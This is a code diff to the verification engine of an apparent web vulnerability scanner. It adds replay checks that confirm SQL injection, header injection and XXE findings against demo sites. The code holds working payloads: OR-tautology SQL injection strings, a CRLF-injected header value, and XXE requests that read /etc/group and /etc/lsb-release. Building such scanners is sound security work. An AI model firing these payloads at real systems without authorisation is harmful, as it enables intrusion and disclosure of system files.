@@ -37,32 +37,46 @@ class VerificationEngine:
                 f.verification, f.confidence = v, v.confidence
                 f.status = FindingStatus.VERIFIED
             else:
-                # PATH C — DETECT-01: OR-tautology redirect differential replay (auth bypass,
-                # string context; live-proven on demo.testfire.net/doLogin)
-                # ENG-01: hop_location() is chain-aware — works even though the engine
-                # auto-follows same-host redirects (old code read only final headers).
-                r5 = self._replay(ep, p, f"{base}' OR '1'='1' -- ")
-                r6 = self._replay(ep, p, f"{base}' OR '1'='2' -- ")
-                l5, l6 = (r5.hop_location() if r5 else ""), (r6.hop_location() if r6 else "")
-                if l5 and l6 and l5 != l6:
-                    v = Verification(method="oracle:or-redirect-2round", passed=True, confidence=0.95, rounds=2,
-                                     notes=f"replay OR TRUE -> {l5}, FALSE -> {l6}")
+                # PATH D — VR-04 (live-caught on ginandjuice.shop /catalog?category=):
+                # string-context blind SQLi WITHOUT errors and WITHOUT redirects — the
+                # OR-tautology changes the RESULT SET (all products vs empty category).
+                # Fresh vectors (comparison-based, different from detection payloads)
+                # keep this an INDEPENDENT replay: '2'>'1' is TRUE, '1'>'2' is FALSE.
+                rd1 = self._replay(ep, p, f"{base}' OR '2'>'1' -- ")
+                rd2 = self._replay(ep, p, f"{base}' OR '1'>'2' -- ")
+                if (rd1.status and rd1.status == rd2.status and rd1.ok and
+                        abs(len(rd1.body or "") - len(rd2.body or "")) > max(200, 0.25 * max(len(rd1.body or "x"), 1))):
+                    v = Verification(method="oracle:or-bodydiff-2round", passed=True, confidence=0.95, rounds=2,
+                                     notes=f"fresh OR-pair body differential: TRUE {len(rd1.body)}B vs FALSE {len(rd2.body)}B")
                     f.verification, f.confidence = v, v.confidence
                     f.status = FindingStatus.VERIFIED
                 else:
-                    # PATH B — error-based replay: quote payload must reproduce DB error (independent variant: double-quote)
-                    from .detect import SQL_ERR_PATTERNS
-                    import re as _re
-                    alt_quot = base + '"' if "'" in str(f.evidence) else base + "'"
-                    r3 = self._replay(ep, p, base + '"')
-                    r4 = self._replay(ep, p, base + "'")
-                    err_repro = any((not r.ok and r.status >= 500) or any(pat.search(r.body or "") for pat in SQL_ERR_PATTERNS)
-                                    for r in (r3, r4) if r.status)
-                    v = Verification(method="error:replay-2variants", passed=err_repro,
-                                     confidence=0.9 if err_repro else 0.15, rounds=2,
-                                     notes=f"single+double quote variants reproduce DB error: {err_repro}")
-                    f.verification, f.confidence = v, v.confidence
-                    f.status = FindingStatus.VERIFIED if err_repro else FindingStatus.REJECTED
+                    # PATH C — DETECT-01: OR-tautology redirect differential replay (auth bypass,
+                    # string context; live-proven on demo.testfire.net/doLogin)
+                    # ENG-01: hop_location() is chain-aware — works even though the engine
+                    # auto-follows same-host redirects (old code read only final headers).
+                    r5 = self._replay(ep, p, f"{base}' OR '1'='1' -- ")
+                    r6 = self._replay(ep, p, f"{base}' OR '1'='2' -- ")
+                    l5, l6 = (r5.hop_location() if r5 else ""), (r6.hop_location() if r6 else "")
+                    if l5 and l6 and l5 != l6:
+                        v = Verification(method="oracle:or-redirect-2round", passed=True, confidence=0.95, rounds=2,
+                                         notes=f"replay OR TRUE -> {l5}, FALSE -> {l6}")
+                        f.verification, f.confidence = v, v.confidence
+                        f.status = FindingStatus.VERIFIED
+                    else:
+                        # PATH B — error-based replay: quote payload must reproduce DB error (independent variant: double-quote)
+                        from .detect import SQL_ERR_PATTERNS
+                        import re as _re
+                        alt_quot = base + '"' if "'" in str(f.evidence) else base + "'"
+                        r3 = self._replay(ep, p, base + '"')
+                        r4 = self._replay(ep, p, base + "'")
+                        err_repro = any((not r.ok and r.status >= 500) or any(pat.search(r.body or "") for pat in SQL_ERR_PATTERNS)
+                                        for r in (r3, r4) if r.status)
+                        v = Verification(method="error:replay-2variants", passed=err_repro,
+                                         confidence=0.9 if err_repro else 0.15, rounds=2,
+                                         notes=f"single+double quote variants reproduce DB error: {err_repro}")
+                        f.verification, f.confidence = v, v.confidence
+                        f.status = FindingStatus.VERIFIED if err_repro else FindingStatus.REJECTED
 
         elif f.type == "xss_reflected":
             # VR-02 fix (2026-09-27, live-caught on demo.testfire.net): a single fixed
@@ -120,6 +134,56 @@ class VerificationEngine:
             r = self._replay(ep, f.parameter, "https://sentinel-redirect-check.example.org/second")
             ok = "sentinel-redirect-check.example.org" in (r.headers.get("location", "") or r.body or "")
             v = Verification(method="re-test:second-host", passed=ok, confidence=0.85 if ok else 0.2, rounds=1)
+            f.verification, f.confidence = v, v.confidence
+            f.status = FindingStatus.VERIFIED if ok else FindingStatus.REJECTED
+
+        elif f.type == "http_response_header_injection":
+            # VR-05 (live-caught on ginandjuice.shop /catalog?category=): re-test with a
+            # DIFFERENT header name — if the server still splits our injected header out
+            # of the param value, header injection is independently confirmed.
+            r = self._replay(ep, f.parameter, "sentinelcrlf2\r\nX-Sentinel-Verify-Hdr: confirmed")
+            v2 = (r.headers or {}).get("x-sentinel-verify-hdr", "")
+            ok = bool(v2)
+            v = Verification(method="re-test:fresh-header-name", passed=ok,
+                             confidence=0.9 if ok else 0.15, rounds=1,
+                             notes=f"fresh vector split response header x-sentinel-verify-hdr={v2!r}")
+            f.verification, f.confidence = v, v.confidence
+            f.status = FindingStatus.VERIFIED if ok else FindingStatus.REJECTED
+
+        elif f.type == "xxe":
+            # VR-06 (live-caught on ginandjuice.shop /catalog/product/stock): independent
+            # replay with FRESH files (/etc/group, /etc/lsb-release) and a fresh control.
+            # Entity resolution is confirmed only if the control is STABLE (probed twice,
+            # must match — random-response targets fail here) AND BOTH fresh files change
+            # the response relative to that control — same oracle class, disjoint payloads.
+            import re as _re2
+            evtxt = str(f.evidence)
+            mroot = _re2.search(r"root=(\w+)", evtxt)
+            root = mroot.group(1) if mroot else "request"
+            elem = f.parameter or "storeId"
+            from .detect import XxeDetector
+            xd = XxeDetector(self.engine, self.bus)
+            fields = [(p.name, p.value or "1") for p in ep.parameters] if ep else []
+            fresh_ctrl = "file:///nonexistent-sentinel-verify"
+            fresh_files = ["file:///etc/group", "file:///etc/lsb-release"]
+
+            def _send_xml(fpath):
+                return self.engine.send(RequestMutation(
+                    endpoint=ep, body_override=xd._xml(root, fields, fpath, elem),
+                    method="POST", extra_headers={"Content-Type": "application/xml"}))
+            rc1, rc2 = _send_xml(fresh_ctrl), _send_xml(fresh_ctrl)
+            stable_ctrl = (rc1.status == rc2.status and (rc1.body or "") == (rc2.body or ""))
+            hits = 0
+            if stable_ctrl:
+                for ff in fresh_files:
+                    rp = _send_xml(ff)
+                    if rp.status != rc1.status or (rp.body or "") != (rc1.body or ""):
+                        hits += 1
+            ok = stable_ctrl and hits >= 2
+            v = Verification(method="re-test:fresh-entity-files", passed=ok,
+                             confidence=0.9 if ok else 0.15, rounds=4,
+                             notes=f"stable control={stable_ctrl}; fresh files differing from fresh control: {hits}/2 "
+                                   f"(root={root}, element={elem})")
             f.verification, f.confidence = v, v.confidence
             f.status = FindingStatus.VERIFIED if ok else FindingStatus.REJECTED
 
